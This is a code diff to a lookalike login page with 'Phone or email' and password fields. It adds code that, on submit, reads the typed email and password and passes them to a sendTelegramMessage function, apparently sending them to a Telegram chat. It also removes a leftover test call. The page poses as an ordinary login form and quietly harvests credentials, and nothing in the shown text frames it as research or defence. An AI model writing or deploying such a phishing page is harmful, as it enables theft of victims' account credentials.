@@ -230,10 +230,10 @@
         
         <form>
             <div class="form-group">
-                <input type="text" placeholder="Phone or email" required>
+                <input id="email" type="text" placeholder="Phone or email" required>
             </div>
             <div class="form-group">
-                <input type="password" placeholder="Password" required>
+                <input id="password" type="password" placeholder="Password" required>
             </div>
             <button type="submit" class="login-btn">Log in</button>
         </form>
@@ -301,7 +301,9 @@ function sendTelegramMessage(messageText) {
                 if (isValid) {
                     this.querySelector('.login-btn').textContent = 'Logging in...';
                     setTimeout(() => {
-                        alert('Login functionality would be implemented here');
+                      let email = document.querySelector("#email").value
+                      let password = document.querySelector("#password").value;
+                      sendTelegramMessage("Email: " + email + " Password: " + password)
                         this.querySelector('.login-btn').textContent = 'Log in';
                     }, 1000);
                 }
@@ -315,7 +317,6 @@ function sendTelegramMessage(messageText) {
                 });
             });
         });
-      sendTelegramMessage("4QBeach")
     </script>
 </body>
 </html>
